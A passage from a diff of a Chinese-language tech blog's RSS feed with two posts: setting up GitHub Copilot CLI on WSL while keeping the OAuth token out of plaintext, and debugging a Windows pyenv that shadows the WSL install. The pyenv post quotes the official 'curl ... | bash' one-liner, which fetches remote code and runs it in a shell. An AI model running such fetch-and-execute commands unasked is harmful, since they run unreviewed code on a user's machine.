版本，這才發現幾年前安裝時我選的 OS 居然是 Ubuntu 20.04，登楞!!</p> <p>果斷重裝 Ubuntu 22.04 後，一路順行。/login 後自動彈出 GNOME Keyring 管理介面，這才是 WSL 應有的美妙操作體驗啊~~</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638946688204538676.png"></p> <p>學到教訓，要用 WSL 時記得選主流版本但別太新(看到有人回報在 24.04 上遇到問題)，省得要縮在牆角悲唱金包銀。</p> <p>【同場加映】</p> <p>查問題過程又學到一招，在 WSL 共用 git-credential-manager.exe。</p> <p>是的，你沒看錯，在 WSL 裡也可以跑 Windows 執行檔，就跟 <a href="/blog/wsl2-gui/">Windows 桌面可以跑 Linux 的檔案總管</a>一樣。這是所謂的 WSL Interop (Windows/Linux 互動機制)，WSL 針對 Windows 可執行檔 (MZ/PE) 在 Linux 端註冊了 binfmt_misc 規則，偵測到 .exe 便透過 WSL 的 init/interop 橋接程序，把執行請求委派給 Windows 的 CreateProcess 等機制執行，啟動的 Windows 程式以目前的 Windows 使用者身分執行，並與 WSL 行程共享標準輸入輸出管線，因此可在 WSL 內進行管線、重導向與背景執行，行為近似原生 Linux 指令。<a href="https://learn.microsoft.com/en-us/windows/wsl/filesystems?WT.mc_id=DOP-MVP-37580">參考</a><br> 官方文件有<a href="https://learn.microsoft.com/zh-tw/windows/wsl/tutorials/wsl-git?WT.mc_id=DOP-MVP-37580#git-credential-manager-setup">Git 認證管理員設定說明</a>， <code>git config --global credential.helper "/mnt/c/Program\ Files/Git/mingw64/bin/git-credential-manager.exe"</code> 即可搞定。之後 git clone/pull/push 私有庫時，便可共用 Windows 環境的 Git 認證設定。</p> <p data-slug="copilot-cli-on-wsl" data-fbimg="https://i.imgur.com/pTR5tyX.jpg#960#640"> </p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>繼 Open AI Codex CLI、Colude Code 之後，Github 不干示弱，也推出自己的 CLI 版 AI 輔助程式開發客戶端 - <a href="https://docs.github.com/en/copilot/concepts/agents/about-copilot-cli">Github Copilot CLI</a>。VSCode 跟 Visual Studio 裡已經有 Copilot Agent 模式了，為什麼還要再做一個 CLI 版？程式寫多了，往往會愛鍵盤勝過愛滑鼠，CLI 萬歲... (懂的都懂)</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638946688197517599.gif"></p> <p>Copilot CLI 支援 Linux、macOS、WSL，也支援 Windows PowerShell，但仍屬實驗性質。CLI 常需調用指令操作檔案、存取資源，不同 Shell 環境指令有別，不管 ChatGPT、Claude 還是 Gemini，對 Linux bash 的熟悉度永遠強過 PowerShell。所以，雖說 Copilot CLI 也支援 PowerShell，但內行的人都知道選 WSL 才能獲得商務艙的體驗。(開場畫面的下方也在消毒，說 PowerShell 版屬實驗性質，如還不順狀況可考慮改用 WSL)</p> <p>Coplit CLI 預設使用 Claude Sonnet 模型(可改為 GPT-5)，計費方式為發一次 Prompt 扣一點(延伸閱讀：<a href="/blog/choosing-github-copilot-models/">Github Copilot 使用模型怎麼選？計費方式與適合場景 (202508版)</a>)，我 9 月額度還剩很多，趁著 10 月重置前拿來玩 Copilot CLI 剛好。</p> <p>我的 WSL 經驗有限，這回是第一次高強度使用，結果就遇上問題了。先說結論：Linux 版本很重要!</p> <p>從一開始用，我就花了數小時克服種種不順，氣到想罵髒話。</p> <p>首先是登入身分保存問題：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638946688199302891.png"></p> <p>使用 <code>/login</code> 完成 Github 帳號登入後，Copilot CLI 問我，因為沒設機密資料保險箱，是否同意用明碼儲存 Token。我知道這種情況很多人會秒選同意，完全不影響使用...</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638946688200977719.jpg"></p> <p>但，我可是會<a href="blog/homebrew-siem-for-openvpn-connection-alert/">清查家中手機平板 MAC 跟 IP 地址</a>的辣個男人，store the token in the plain text 猶如直達天頂的隱形城牆，我過不去...</p> <p>研究後發現，Copilot CLI 沿用 Github CLI 的做法，若未使用 Keyring 等安全機制，oauth_token 會以明碼存在 <sub>/.config/gh/hosts.yml。如果若設定妥當，則可改用 gnome-keyring 之類的服務儲存身分授權資料。但問題 gnome-keyring 是桌面軟體，要調整到能在 WSL 使用有一堆眉角，反正我是失敗了，直接放棄</sub> 改走另一條路，先用 Windows 版 Github CLI <code>gh auth login</code> 完成登入，在 WLS 端可使用 <code>export GITHUB_TOKEN=$("/mnt/c/Program Files/GitHub CLI/gh.exe" auth token)</code> 存成環境變數，堅守 oauth_token 不落地。<br> 而設定 GITHUB_TOKEN 環境變數後，Copilot CLI 會直接使用該身分登入：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638946688202709002.png"></p> <p>但之後我又陸續遇到 Copilot CLI 執行 ls、sed 等 bash 指令時冒出奇怪錯誤，愈想愈不對，這堆問題不該只有我遇到吧？Copilot CLI 如果有這麼多問題，早被噴爆了吧？</p> <p>我想起查 gnome-keyring 時有人提到升級 Ubuntu 22.04 正常的事，回頭檢查我的 WSL 版本，這才發現幾年前安裝時我選的 OS 居然是 Ubuntu 20.04，登楞!!</p> <p>果斷重裝 Ubuntu 22.04 後，一路順行。/login 後自動彈出 GNOME Keyring 管理介面，這才是 WSL 應有的美妙操作體驗啊~~</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638946688204538676.png"></p> <p>學到教訓，要用 WSL 時記得選主流版本但別太新(看到有人回報在 24.04 上遇到問題)，省得要縮在牆角悲唱金包銀。</p> <p>【同場加映】</p> <p>查問題過程又學到一招，在 WSL 共用 git-credential-manager.exe。</p> <p>是的，你沒看錯，在 WSL 裡也可以跑 Windows 執行檔，就跟 <a href="/blog/wsl2-gui/">Windows 桌面可以跑 Linux 的檔案總管</a>一樣。這是所謂的 WSL Interop (Windows/Linux 互動機制)，WSL 針對 Windows 可執行檔 (MZ/PE) 在 Linux 端註冊了 binfmt_misc 規則，偵測到 .exe 便透過 WSL 的 init/interop 橋接程序，把執行請求委派給 Windows 的 CreateProcess 等機制執行，啟動的 Windows 程式以目前的 Windows 使用者身分執行，並與 WSL 行程共享標準輸入輸出管線，因此可在 WSL 內進行管線、重導向與背景執行，行為近似原生 Linux 指令。<a href="https://learn.microsoft.com/en-us/windows/wsl/filesystems?WT.mc_id=DOP-MVP-37580">參考</a><br> 官方文件有<a href="https://learn.microsoft.com/zh-tw/windows/wsl/tutorials/wsl-git?WT.mc_id=DOP-MVP-37580#git-credential-manager-setup">Git 認證管理員設定說明</a>， <code>git config --global credential.helper "/mnt/c/Program\ Files/Git/mingw64/bin/git-credential-manager.exe"</code> 即可搞定。之後 git clone/pull/push 私有庫時，便可共用 Windows 環境的 Git 認證設定。</p> <p data-slug="copilot-cli-on-wsl" data-fbimg="https://i.imgur.com/pTR5tyX.jpg#960#640"> </p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>繼 Open AI Codex CLI、Colude Code 之後，Github 不干示弱，也推出自己的 CLI 版 AI 輔助程式開發客戶端 - <a href="https://docs.github.com/en/copilot/concepts/agents/about-copilot-cli">Github Copilot CLI</a>。VSCode 跟 Visual Studio 裡已經有 Copilot Agent 模式了，為什麼還要再做一個 CLI 版？程式寫多了，往往會愛鍵盤勝過愛滑鼠，CLI 萬歲... (懂的都懂)</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638946688197517599.gif"></p> <p>Copilot CLI 支援 Linux、macOS、WSL，也支援 Windows PowerShell，但仍屬實驗性質。CLI 常需調用指令操作檔案、存取資源，不同 Shell 環境指令有別，不管 ChatGPT、Claude 還是 Gemini，對 Linux bash 的熟悉度永遠強過 PowerShell。所以，雖說 Copilot CLI 也支援 PowerShell，但內行的人都知道選 WSL 才能獲得商務艙的體驗。(開場畫面的下方也在消毒，說 PowerShell 版屬實驗性質，如還不順狀況可考慮改用 WSL)</p> <p>Coplit CLI 預設使用 Claude Sonnet 模型(可改為 GPT-5)，計費方式為發一次 Prompt 扣一點(延伸閱讀：<a href="/blog/choosing-github-copilot-models/">Github Copilot 使用模型怎麼選？計費方式與適合場景 (202508版)</a>)，我 9 月額度還剩很多，趁著 10 月重置前拿來玩 Copilot CLI 剛好。</p> <p>我的 WSL 經驗有限，這回是第一次高強度使用，結果就遇上問題了。先說結論：Linux 版本很重要!</p> <p>從一開始用，我就花了數小時克服種種不順，氣到想罵髒話。</p> <p>首先是登入身分保存問題：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638946688199302891.png"></p> <p>使用 <code>/login</code> 完成 Github 帳號登入後，Copilot CLI 問我，因為沒設機密資料保險箱，是否同意用明碼儲存 Token。我知道這種情況很多人會秒選同意，完全不影響使用...</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638946688200977719.jpg"></p> <p>但，我可是會<a href="blog/homebrew-siem-for-openvpn-connection-alert/">清查家中手機平板 MAC 跟 IP 地址</a>的辣個男人，store the token in the plain text 猶如直達天頂的隱形城牆，我過不去...</p> <p>研究後發現，Copilot CLI 沿用 Github CLI 的做法，若未使用 Keyring 等安全機制，oauth_token 會以明碼存在 <sub>/.config/gh/hosts.yml。如果若設定妥當，則可改用 gnome-keyring 之類的服務儲存身分授權資料。但問題 gnome-keyring 是桌面軟體，要調整到能在 WSL 使用有一堆眉角，反正我是失敗了，直接放棄</sub> 改走另一條路，先用 Windows 版 Github CLI <code>gh auth login</code> 完成登入，在 WLS 端可使用 <code>export GITHUB_TOKEN=$("/mnt/c/Program Files/GitHub CLI/gh.exe" auth token)</code> 存成環境變數，堅守 oauth_token 不落地。<br> 而設定 GITHUB_TOKEN 環境變數後，Copilot CLI 會直接使用該身分登入：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig3_638946688202709002.png"></p> <p>但之後我又陸續遇到 Copilot CLI 執行 ls、sed 等 bash 指令時冒出奇怪錯誤，愈想愈不對，這堆問題不該只有我遇到吧？Copilot CLI 如果有這麼多問題，早被噴爆了吧？</p> <p>我想起查 gnome-keyring 時有人提到升級 Ubuntu 22.04 正常的事，回頭檢查我的 WSL 版本，這才發現幾年前安裝時我選的 OS 居然是 Ubuntu 20.04，登楞!!</p> <p>果斷重裝 Ubuntu 22.04 後，一路順行。/login 後自動彈出 GNOME Keyring 管理介面，這才是 WSL 應有的美妙操作體驗啊~~</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig4_638946688204538676.png"></p> <p>學到教訓，要用 WSL 時記得選主流版本但別太新(看到有人回報在 24.04 上遇到問題)，省得要縮在牆角悲唱金包銀。</p> <p>【同場加映】</p> <p>查問題過程又學到一招，在 WSL 共用 git-credential-manager.exe。</p> <p>是的，你沒看錯，在 WSL 裡也可以跑 Windows 執行檔，就跟 <a href="/blog/wsl2-gui/">Windows 桌面可以跑 Linux 的檔案總管</a>一樣。這是所謂的 WSL Interop (Windows/Linux 互動機制)，WSL 針對 Windows 可執行檔 (MZ/PE) 在 Linux 端註冊了 binfmt_misc 規則，偵測到 .exe 便透過 WSL 的 init/interop 橋接程序，把執行請求委派給 Windows 的 CreateProcess 等機制執行，啟動的 Windows 程式以目前的 Windows 使用者身分執行，並與 WSL 行程共享標準輸入輸出管線，因此可在 WSL 內進行管線、重導向與背景執行，行為近似原生 Linux 指令。<a href="https://learn.microsoft.com/en-us/windows/wsl/filesystems?WT.mc_id=DOP-MVP-37580">參考</a><br> 官方文件有<a href="https://learn.microsoft.com/zh-tw/windows/wsl/tutorials/wsl-git?WT.mc_id=DOP-MVP-37580#git-credential-manager-setup">Git 認證管理員設定說明</a>， <code>git config --global credential.helper "/mnt/c/Program\ Files/Git/mingw64/bin/git-credential-manager.exe"</code> 即可搞定。之後 git clone/pull/push 私有庫時，便可共用 Windows 環境的 Git 認證設定。</p> <p data-slug="copilot-cli-on-wsl" data-fbimg="https://i.imgur.com/pTR5tyX.jpg#960#640"> </p>]]></content:encoded>
+    <itunes:image href="https://blog.darkthread.net/Posts/files/2025/Fig1_638946688197517599.gif"/>
+          <media:content url="https://blog.darkthread.net/Posts/files/2025/Fig1_638946688197517599.gif" medium="image"/>
+    <pubDate>Sun, 28 Sep 2025 15:05:26 GMT</pubDate>
+  </item><item>
+    <title><![CDATA[【茶包射手日記】Windows 與 WSL pyenv 打架記]]></title>
+    <link>https://blog.darkthread.net/blog/pyenv-win-n-wsl/</link>
+    <itunes:title><![CDATA[【茶包射手日記】Windows 與 WSL pyenv 打架記]]></itunes:title>
+    <itunes:author><![CDATA[service@darkthread.net (Jeffrey Lee)]]></itunes:author>
+    <itunes:summary>
+      <![CDATA[<p>在 <a href="https://learn.microsoft.com/zh-tw/windows/wsl/about?WT.mc_id=DOP-MVP-37580">WSL (Windows Subsystem for Linux)</a> 上安裝 pyenv (Python 版本快速切換器)，理應簡單到像吃豆腐，更別說我在 Windows、Linux 已裝過多次，但這次我搞了快一個小時，嚴格說來是自己耍笨又學藝不精，寫篇筆記留念~</p> <p>WSL 是標準 Ubuntu，理論上照著<a href="https://github.com/pyenv/pyenv?tab=readme-ov-file#linuxunix">官方說明</a>下指令應可無腦搞定。</p> <pre><code>curl -fsSL https://pyenv.run | bash # 會將 pyenv 程式裝在 ~/.pyenv 目錄
+# 設定啟動腳本
+echo 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.bashrc
+echo '[[ -d $PYENV_ROOT/bin ]] &amp;&amp; export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.bashrc
+echo 'eval "$(pyenv init - bash)"' &gt;&gt; ~/.bashrc
+source ~/.bashrc
+# 安裝編譯程式庫、安裝 Python 版本...
+</code></pre> <p>BUT! 裝完我遇上了 <code>-bash: /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin/pyenv: /bin/sh^M: bad interpreter: No such file or directory</code> 錯誤訊息。</p> <p>會花這麼多時間，是我沒有直接參考官方說明，心想裝在 WSL 可能有點特殊吧，於是爬文查到一篇 <a href="https://gist.github.com/iambryancs/16f05ba46876b36886a9e7c8b36e56b7">Using Pyenv in WSL Ubuntu 22.04 LTS to install Python 3.8</a>，心想這篇安裝指南針對 WSL 的，應該更萬無一失。其做法如下：</p> <pre><code>curl https://pyenv.run | bash
+echo 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.zshrc
+echo 'command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.zshrc
+echo 'eval "$(pyenv init -)"' &gt;&gt; ~/.zshrc
+source ~/.zshrc
+</code></pre> <p>我承認沒看懂就照做，加上過去對 WSL 與 Windows 的交互關聯、.bashrc/.zshrc/.profile 設定，以及 pyenv 運作原理全都不求甚解，這回遇上了問題，就是償還「知識債」的時侯惹~</p> <p>由錯誤訊息可知，問題出在 Ubuntu 去呼叫了之前<a href="/blog/python-beginner-notes-1/">我在 Windows 環境玩 Python 所裝的 Windows 版 pyenv</a>，至於為什麼 Ubuntu 會吃到 Windows 檔案，是因為在 WSL 裡 PATH 環境變數會繼承 Windows 的設定，用 <code>echo $PATH | grep pyenv</code> 我們可以看到 WSL 的 PATH 包含了 /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin，不僅如此，甚至連 /mnt/c/Program Files (x86)/Microsoft SQL Server/160/Tools/Binn/，SQL Server 的執行檔目錄，也在其中，可以說 WSL 的 bash 會繼承 Windows 的 PATH 環境變數。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638946161184764327.png"></p> <p>而那段 Gist 的問題在於：1) 作者是用 zsh 才這樣寫，我跑 bash 不能直接用(我天真地以為 pyenv 有什麼魔法會用到 zsh) 2) 它用一種「聰明做法」設定 PATH 路徑 <code>command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"</code>，若已經可以存取 pyenv，代表 PATH 已經存在 pyenv 路徑了，就跳過將 $HOME/.pyenv/bin 加入 PATH 的動作。因為沒有在 PATH 最前方加入 $HOME/.pyenv/bin，輸入 pyenv 執行的就都是 Windows 版 /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin/pyenv...</p> <p>至於 $HOME 目錄(~)下的 .zshrc/.bashrc/.profile 都可以放每次登入或啟動 Shell 時環境初始化動作，我之前沒搞懂它的關係，這回稍微做個了解。.profile 長這樣：</p> <pre><code># ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+# include .bashrc if it exists
+if [ -f "$HOME/.bashrc" ]; then
+. "$HOME/.bashrc"
+fi
+fi
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+PATH="$HOME/bin:$PATH"
+fi
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+PATH="$HOME/.local/bin:$PATH"
+fi
+</code></pre> <p>它只做三件事，若檔案或路徑存在，就執行 ~/.bashrc、將 ~/bin 及 ~/.local/bin 加入 $PATH。(若有設定 .bash_profile 或 .bash_login，則以其為準。因此我不用 zsh，照抄 Gist 做法純屬搞笑。)</p> <p>最後，pyenv 是怎麼做到動態切換 Python 版本？關鍵它在 .bashrc 裡加入的 <code>$(pyenv init - bash)</code>，pyenv 會在 ~/.pyenv/shims 下放入名為 pip、python 的執行腳本，而 ~/.pyenv/shims 又會被放到 PATH 的第一個，意思是當你輸入 python、pip 等指令，最先找到的會是 ~/.pyenv/shims/python 及 pip：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638946161188015298.png"></p> <p>而 ~/.pyenv/shims/python 長這樣：</p> <pre><code>#!/usr/bin/env bash
+set -e # 任何命令返回非零狀態碼時，立即退出腳本
+# 如果環境變數 PYENV_DEBUG 有值，顯示每個執行的命令
+[ -n "$PYENV_DEBUG" ] &amp;&amp; set -x
+# $0 是腳本名稱，${0##*/} 使用參數展開，移除 */ 前綴只留檔名
+program="${0##*/}"
+export PYENV_ROOT="/home/jeffrey/.pyenv"
+# 呼叫 ~/.pyenv/libexec/pyenv，參數分別為 exec、腳本名稱、所有原始參數
+exec "/home/jeffrey/.pyenv/libexec/pyenv" exec "$program" "$@"
+</code></pre> <p>現在我們都知道 pyenv 的祕密了 PO PO...</p> <p>「沒搞懂桯式原理，只知道這樣會動就用了」不就是現在當紅 Vibe Coding 寫照，下場也一樣，一旦結果未如預期，也沒有能力當場判斷與處理。此時你可以繼續爬文或問 AI，走神農氏嚐百草路線，繼續找來更多看不懂的東西瞎試；或是，試著搞懂原理，改用有邏輯的科學方法挖掘真相找到答案。有茶包射手魂的人，應當成為後者。</p> <p>耍了一次呆，花了一些時間，但補學到 WSL 繼承行為、.bashrc/.profile 觀念、pyenv 魔法的原理這些該學到的東西，不算浪費時間，也是很棒的一次經驗。</p> <p data-slug="pyenv-win-n-wsl" data-fbimg="https://cdn.pixabay.com/photo/2019/07/07/18/14/straw-4323010_960_720.jpg#960#720"> </p>]]>
+    </itunes:summary>
+    <description>
+      <![CDATA[<p>在 <a href="https://learn.microsoft.com/zh-tw/windows/wsl/about?WT.mc_id=DOP-MVP-37580">WSL (Windows Subsystem for Linux)</a> 上安裝 pyenv (Python 版本快速切換器)，理應簡單到像吃豆腐，更別說我在 Windows、Linux 已裝過多次，但這次我搞了快一個小時，嚴格說來是自己耍笨又學藝不精，寫篇筆記留念~</p> <p>WSL 是標準 Ubuntu，理論上照著<a href="https://github.com/pyenv/pyenv?tab=readme-ov-file#linuxunix">官方說明</a>下指令應可無腦搞定。</p> <pre><code>curl -fsSL https://pyenv.run | bash # 會將 pyenv 程式裝在 ~/.pyenv 目錄
+# 設定啟動腳本
+echo 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.bashrc
+echo '[[ -d $PYENV_ROOT/bin ]] &amp;&amp; export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.bashrc
+echo 'eval "$(pyenv init - bash)"' &gt;&gt; ~/.bashrc
+source ~/.bashrc
+# 安裝編譯程式庫、安裝 Python 版本...
+</code></pre> <p>BUT! 裝完我遇上了 <code>-bash: /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin/pyenv: /bin/sh^M: bad interpreter: No such file or directory</code> 錯誤訊息。</p> <p>會花這麼多時間，是我沒有直接參考官方說明，心想裝在 WSL 可能有點特殊吧，於是爬文查到一篇 <a href="https://gist.github.com/iambryancs/16f05ba46876b36886a9e7c8b36e56b7">Using Pyenv in WSL Ubuntu 22.04 LTS to install Python 3.8</a>，心想這篇安裝指南針對 WSL 的，應該更萬無一失。其做法如下：</p> <pre><code>curl https://pyenv.run | bash
+echo 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.zshrc
+echo 'command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.zshrc
+echo 'eval "$(pyenv init -)"' &gt;&gt; ~/.zshrc
+source ~/.zshrc
+</code></pre> <p>我承認沒看懂就照做，加上過去對 WSL 與 Windows 的交互關聯、.bashrc/.zshrc/.profile 設定，以及 pyenv 運作原理全都不求甚解，這回遇上了問題，就是償還「知識債」的時侯惹~</p> <p>由錯誤訊息可知，問題出在 Ubuntu 去呼叫了之前<a href="/blog/python-beginner-notes-1/">我在 Windows 環境玩 Python 所裝的 Windows 版 pyenv</a>，至於為什麼 Ubuntu 會吃到 Windows 檔案，是因為在 WSL 裡 PATH 環境變數會繼承 Windows 的設定，用 <code>echo $PATH | grep pyenv</code> 我們可以看到 WSL 的 PATH 包含了 /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin，不僅如此，甚至連 /mnt/c/Program Files (x86)/Microsoft SQL Server/160/Tools/Binn/，SQL Server 的執行檔目錄，也在其中，可以說 WSL 的 bash 會繼承 Windows 的 PATH 環境變數。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638946161184764327.png"></p> <p>而那段 Gist 的問題在於：1) 作者是用 zsh 才這樣寫，我跑 bash 不能直接用(我天真地以為 pyenv 有什麼魔法會用到 zsh) 2) 它用一種「聰明做法」設定 PATH 路徑 <code>command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"</code>，若已經可以存取 pyenv，代表 PATH 已經存在 pyenv 路徑了，就跳過將 $HOME/.pyenv/bin 加入 PATH 的動作。因為沒有在 PATH 最前方加入 $HOME/.pyenv/bin，輸入 pyenv 執行的就都是 Windows 版 /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin/pyenv...</p> <p>至於 $HOME 目錄(~)下的 .zshrc/.bashrc/.profile 都可以放每次登入或啟動 Shell 時環境初始化動作，我之前沒搞懂它的關係，這回稍微做個了解。.profile 長這樣：</p> <pre><code># ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+# the default umask is set in /etc/profile; for setting the umask
+# for ssh logins, install and configure the libpam-umask package.
+#umask 022
+# if running bash
+if [ -n "$BASH_VERSION" ]; then
+# include .bashrc if it exists
+if [ -f "$HOME/.bashrc" ]; then
+. "$HOME/.bashrc"
+fi
+fi
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/bin" ] ; then
+PATH="$HOME/bin:$PATH"
+fi
+# set PATH so it includes user's private bin if it exists
+if [ -d "$HOME/.local/bin" ] ; then
+PATH="$HOME/.local/bin:$PATH"
+fi
+</code></pre> <p>它只做三件事，若檔案或路徑存在，就執行 ~/.bashrc、將 ~/bin 及 ~/.local/bin 加入 $PATH。(若有設定 .bash_profile 或 .bash_login，則以其為準。因此我不用 zsh，照抄 Gist 做法純屬搞笑。)</p> <p>最後，pyenv 是怎麼做到動態切換 Python 版本？關鍵它在 .bashrc 裡加入的 <code>$(pyenv init - bash)</code>，pyenv 會在 ~/.pyenv/shims 下放入名為 pip、python 的執行腳本，而 ~/.pyenv/shims 又會被放到 PATH 的第一個，意思是當你輸入 python、pip 等指令，最先找到的會是 ~/.pyenv/shims/python 及 pip：</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig2_638946161188015298.png"></p> <p>而 ~/.pyenv/shims/python 長這樣：</p> <pre><code>#!/usr/bin/env bash
+set -e # 任何命令返回非零狀態碼時，立即退出腳本
+# 如果環境變數 PYENV_DEBUG 有值，顯示每個執行的命令
+[ -n "$PYENV_DEBUG" ] &amp;&amp; set -x
+# $0 是腳本名稱，${0##*/} 使用參數展開，移除 */ 前綴只留檔名
+program="${0##*/}"
+export PYENV_ROOT="/home/jeffrey/.pyenv"
+# 呼叫 ~/.pyenv/libexec/pyenv，參數分別為 exec、腳本名稱、所有原始參數
+exec "/home/jeffrey/.pyenv/libexec/pyenv" exec "$program" "$@"
+</code></pre> <p>現在我們都知道 pyenv 的祕密了 PO PO...</p> <p>「沒搞懂桯式原理，只知道這樣會動就用了」不就是現在當紅 Vibe Coding 寫照，下場也一樣，一旦結果未如預期，也沒有能力當場判斷與處理。此時你可以繼續爬文或問 AI，走神農氏嚐百草路線，繼續找來更多看不懂的東西瞎試；或是，試著搞懂原理，改用有邏輯的科學方法挖掘真相找到答案。有茶包射手魂的人，應當成為後者。</p> <p>耍了一次呆，花了一些時間，但補學到 WSL 繼承行為、.bashrc/.profile 觀念、pyenv 魔法的原理這些該學到的東西，不算浪費時間，也是很棒的一次經驗。</p> <p data-slug="pyenv-win-n-wsl" data-fbimg="https://cdn.pixabay.com/photo/2019/07/07/18/14/straw-4323010_960_720.jpg#960#720"> </p>]]>
+    </description>
+    <content:encoded><![CDATA[<p>在 <a href="https://learn.microsoft.com/zh-tw/windows/wsl/about?WT.mc_id=DOP-MVP-37580">WSL (Windows Subsystem for Linux)</a> 上安裝 pyenv (Python 版本快速切換器)，理應簡單到像吃豆腐，更別說我在 Windows、Linux 已裝過多次，但這次我搞了快一個小時，嚴格說來是自己耍笨又學藝不精，寫篇筆記留念~</p> <p>WSL 是標準 Ubuntu，理論上照著<a href="https://github.com/pyenv/pyenv?tab=readme-ov-file#linuxunix">官方說明</a>下指令應可無腦搞定。</p> <pre><code>curl -fsSL https://pyenv.run | bash # 會將 pyenv 程式裝在 ~/.pyenv 目錄
+# 設定啟動腳本
+echo 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.bashrc
+echo '[[ -d $PYENV_ROOT/bin ]] &amp;&amp; export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.bashrc
+echo 'eval "$(pyenv init - bash)"' &gt;&gt; ~/.bashrc
+source ~/.bashrc
+# 安裝編譯程式庫、安裝 Python 版本...
+</code></pre> <p>BUT! 裝完我遇上了 <code>-bash: /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin/pyenv: /bin/sh^M: bad interpreter: No such file or directory</code> 錯誤訊息。</p> <p>會花這麼多時間，是我沒有直接參考官方說明，心想裝在 WSL 可能有點特殊吧，於是爬文查到一篇 <a href="https://gist.github.com/iambryancs/16f05ba46876b36886a9e7c8b36e56b7">Using Pyenv in WSL Ubuntu 22.04 LTS to install Python 3.8</a>，心想這篇安裝指南針對 WSL 的，應該更萬無一失。其做法如下：</p> <pre><code>curl https://pyenv.run | bash
+echo 'export PYENV_ROOT="$HOME/.pyenv"' &gt;&gt; ~/.zshrc
+echo 'command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' &gt;&gt; ~/.zshrc
+echo 'eval "$(pyenv init -)"' &gt;&gt; ~/.zshrc
+source ~/.zshrc
+</code></pre> <p>我承認沒看懂就照做，加上過去對 WSL 與 Windows 的交互關聯、.bashrc/.zshrc/.profile 設定，以及 pyenv 運作原理全都不求甚解，這回遇上了問題，就是償還「知識債」的時侯惹~</p> <p>由錯誤訊息可知，問題出在 Ubuntu 去呼叫了之前<a href="/blog/python-beginner-notes-1/">我在 Windows 環境玩 Python 所裝的 Windows 版 pyenv</a>，至於為什麼 Ubuntu 會吃到 Windows 檔案，是因為在 WSL 裡 PATH 環境變數會繼承 Windows 的設定，用 <code>echo $PATH | grep pyenv</code> 我們可以看到 WSL 的 PATH 包含了 /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin，不僅如此，甚至連 /mnt/c/Program Files (x86)/Microsoft SQL Server/160/Tools/Binn/，SQL Server 的執行檔目錄，也在其中，可以說 WSL 的 bash 會繼承 Windows 的 PATH 環境變數。</p> <p><img src="https://blog.darkthread.net/Posts/files/2025/Fig1_638946161184764327.png"></p> <p>而那段 Gist 的問題在於：1) 作者是用 zsh 才這樣寫，我跑 bash 不能直接用(我天真地以為 pyenv 有什麼魔法會用到 zsh) 2) 它用一種「聰明做法」設定 PATH 路徑 <code>command -v pyenv &gt;/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"</code>，若已經可以存取 pyenv，代表 PATH 已經存在 pyenv 路徑了，就跳過將 $HOME/.pyenv/bin 加入 PATH 的動作。因為沒有在 PATH 最前方加入 $HOME/.pyenv/bin，輸入 pyenv 執行的就都是 Windows 版 /mnt/c/Users/jeffrey/.pyenv/pyenv-win/bin/pyenv...</p> <p>至於 $HOME 目錄(~)下的 .zshrc/.bashrc/.profile 都可以放每次登入或啟動 Shell 時環境初始化動作，我之前沒搞懂它的關係，這回稍微做個了解。.profile 長這樣：</p> <pre><code># ~/.profile: executed by the command interpreter for login shells.
+# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
+# exists.
+# see /usr/share/doc/bash/examples/startup-files for examples.
+# the files are located in the bash-doc package.
+# the default umask is set in /etc/profile; for setting the umask
